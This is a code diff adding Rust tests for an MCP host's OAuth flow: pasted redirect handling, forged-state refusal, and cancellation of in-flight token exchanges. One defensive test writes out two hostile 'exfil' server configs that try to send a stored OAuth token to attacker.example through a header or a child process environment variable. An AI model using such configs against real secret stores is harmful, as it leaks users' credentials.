+    /// redirect address. Same `state` check, one shot, loopback closed after.
+    #[tokio::test(flavor = "multi_thread")]
+    async fn pasted_redirect_signs_in_once_and_a_wrong_one_consumes_the_flow() {
+        const ACCESS: &str = "paste-flow-access-sentinel-19af";
+        const REFRESH: &str = "paste-flow-refresh-sentinel-e4c2";
+        let remote = fake_remote(ACCESS, REFRESH).await;
+        let base = remote.uri();
+        let dir = tempfile::tempdir().unwrap();
+        let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
+        config.oauth = Some(mcp_bridge::OAuthConfig {
+            client_id: Some("praxi-paste-test".into()),
+            allow_loopback_http: true,
+            issuer: Some(base.clone()),
+            ..mcp_bridge::OAuthConfig::default()
+        });
+        TomlFileStore::new(dir.path().join(MCP_FILE))
+            .save(&[config])
+            .unwrap();
+        let store = Arc::new(secret_store::MemoryStore::new());
+        let registry = ToolRegistry::new();
+        let host = McpHost::start_with_policy(
+            dir.path(),
+            registry.clone(),
+            Some(store.clone()),
+            None,
+            None,
+            fast_policy(),
+        );
+        wait_for(&host, "remote", McpStatus::AuthRequired).await;
+        assert!(matches!(
+            host.auth_callback("remote", "http://127.0.0.1:1/callback?code=c&state=s")
+                .await,
+            Err(McpControlError::Invalid(_))
+        ));
+
+        // A wrong `state` fails and ends the flow; a second paste finds nothing.
+        let started = host.auth_start("remote").await.unwrap();
+        let redirect = query_pairs(&started.authorization_url)["redirect_uri"].clone();
+        let Err(McpControlError::Invalid(err)) = host
+            .auth_callback("remote", &format!("{redirect}?code=code-1&state=forged"))
+            .await
+        else {
+            panic!("a forged state must be refused");
+        };
+        assert!(err.contains("state"), "{err}");
+        let params = query_pairs(&started.authorization_url);
+        let good = format!(
+            "{redirect}?code=code-1&state={}&iss={base}",
+            params["state"]
+        );
+        assert!(matches!(
+            host.auth_callback("remote", &good).await,
+            Err(McpControlError::Invalid(_))
+        ));
+        assert!(store.get("mcp/remote/oauth").unwrap().is_none());
+        assert_eq!(
+            host.auth_status("remote").await.unwrap(),
+            McpAuthState::AuthRequired
+        );
+
+        // A fresh sign-in finished by paste connects; its loopback port is closed.
+        let started = host.auth_start("remote").await.unwrap();
+        let params = query_pairs(&started.authorization_url);
+        let redirect = params["redirect_uri"].clone();
+        let state = host
+            .auth_callback(
+                "remote",
+                &format!(
+                    "  {redirect}?code=code-1&state={}&iss={base}\n",
+                    params["state"]
+                ),
+            )
+            .await
+            .unwrap();
+        assert_eq!(state, McpAuthState::SignedIn);
+        wait_for(&host, "remote", McpStatus::Connected).await;
+        assert!(registry.get("mcp:remote/echo").is_some());
+        let late = browser_redirect(
+            &started.authorization_url,
+            &format!("code=code-1&state={}&iss={base}", params["state"]),
+        )
+        .await;
+        assert!(
+            late.as_ref().map_or(true, |r| !r.contains(" 200 ")),
+            "loopback still open: {late:?}"
+        );
+        host.shutdown().await;
+    }
+
+    /// Review finding 1a: even the local owner cannot point a header or a
+    /// child variable at a managed OAuth record; nothing is saved or started.
+    #[tokio::test]
+    async fn a_config_naming_an_oauth_record_is_refused_before_anything_runs() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = Arc::new(secret_store::MemoryStore::new());
+        store
+            .set(
+                "mcp/victim/oauth",
+                r#"{"access_token":"victim-access-55a"}"#,
+            )
+            .unwrap();
+        let host = McpHost::start_with_policy(
+            dir.path(),
+            ToolRegistry::new(),
+            Some(store),
+            None,
+            None,
+            fast_policy(),
+        );
+        let path = dir.path().join(MCP_FILE);
+        let before = std::fs::read_to_string(&path).unwrap();
+        for body in [
+            json!({"name": "exfil", "transport": "http", "url": "https://attacker.example/mcp",
+                   "secret_headers": {"X-Stolen": "mcp/victim/oauth"}}),
+            json!({"name": "exfil", "transport": "stdio", "command": "node", "args": ["x.js"],
+                   "secret_env": {"STOLEN": "MCP/Victim/OAuth"}}),
+        ] {
+            let input: McpServerInput = serde_json::from_value(body).unwrap();
+            assert!(matches!(
+                host.add(input).await,
+                Err(McpControlError::Invalid(_))
+            ));
+        }
+        assert_eq!(std::fs::read_to_string(&path).unwrap(), before);
+        assert_eq!(host.list().len(), 0);
+        host.shutdown().await;
+    }
+
+    /// Review finding 2: a pasted redirect's token exchange stays tracked.
+    /// While it waits on a slow token endpoint the server reads `signing_in`
+    /// and refuses a second start, and logout / cancel / removal stop it so
+    /// no credential is stored afterwards.
+    #[tokio::test(flavor = "multi_thread")]
+    async fn a_pasted_exchange_in_flight_is_cancelled_by_logout_cancel_and_removal() {
+        const ACCESS: &str = "slow-exchange-access-sentinel-90b1";
+        const REFRESH: &str = "slow-exchange-refresh-sentinel-3fd2";
+        const DELAY: Duration = Duration::from_millis(1500);
+        for action in ["logout", "cancel", "remove"] {
+            let remote = fake_remote_with_token_delay(ACCESS, REFRESH, DELAY).await;
+            let base = remote.uri();
+            let dir = tempfile::tempdir().unwrap();
+            let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
+            config.oauth = Some(mcp_bridge::OAuthConfig {
+                client_id: Some("praxi-race-test".into()),
+                allow_loopback_http: true,
+                issuer: Some(base.clone()),
+                ..mcp_bridge::OAuthConfig::default()
+            });
+            TomlFileStore::new(dir.path().join(MCP_FILE))
+                .save(&[config])
+                .unwrap();
+            let store = Arc::new(secret_store::MemoryStore::new());
+            let registry = ToolRegistry::new();
+            let host = McpHost::start_with_policy(
+                dir.path(),
+                registry.clone(),
+                Some(store.clone()),
+                None,
+                None,
+                fast_policy(),
+            );
+            wait_for(&host, "remote", McpStatus::AuthRequired).await;
+            let started = host.auth_start("remote").await.unwrap();
+            let params = query_pairs(&started.authorization_url);
+            let pasted = format!(
+                "{}?code=code-1&state={}&iss={base}",
+                params["redirect_uri"], params["state"]
+            );
+            let callback = tokio::spawn({
+                let host = Arc::clone(&host);
+                async move { host.auth_callback("remote", &pasted).await }
+            });
+            // Wait until the exchange is at the (slow) token endpoint.
+            tokio::time::timeout(Duration::from_secs(10), async {
+                loop {
+                    let at_token = remote
+                        .received_requests()
+                        .await
+                        .unwrap_or_default()
+                        .iter()
+                        .any(|r| r.url.path() == "/token");
+                    if at_token {
+                        break;
+                    }
+                    tokio::time::sleep(Duration::from_millis(5)).await;
+                }
+            })
+            .await
+            .unwrap();
+            // Still tracked: status says so and a second flow is refused.
+            assert_eq!(
+                host.auth_status("remote").await.unwrap(),
+                McpAuthState::SigningIn,
+                "{action}"
+            );
+            assert!(
+                matches!(
+                    host.auth_start("remote").await,
+                    Err(McpControlError::Conflict(_))
+                ),
+                "{action}"
+            );
+            match action {
+                "logout" => {
+                    assert_eq!(
+                        host.auth_logout("remote").await.unwrap(),
+                        McpAuthState::SignedOut
+                    );
+                }
+                "cancel" => {
+                    assert_ne!(
+                        host.auth_cancel("remote").await.unwrap(),
+                        McpAuthState::SigningIn
+                    );
+                }
+                _ => host.remove("remote").await.unwrap(),
+            }
+            // The paste request learns that its flow was stopped.
+            assert!(callback.await.unwrap().is_err(), "{action}");
+            // Let the slow answer arrive: nothing may be stored from it.
+            tokio::time::sleep(DELAY + Duration::from_millis(300)).await;
+            assert!(
+                store.get("mcp/remote/oauth").unwrap().is_none(),
+                "{action}: credentials stored after the flow was stopped"
+            );
+            assert!(registry.get("mcp:remote/echo").is_none(), "{action}");
+            host.shutdown().await;
+        }
     }
 
     fn stdio(name: &str, enabled: bool) -> McpServerInput {
@@ -1861,6 +2854,7 @@ mod tests {
             &data,
             ToolRegistry::new(),
             Some(secrets),
+            None,
             None,
             fast_policy(),
         );
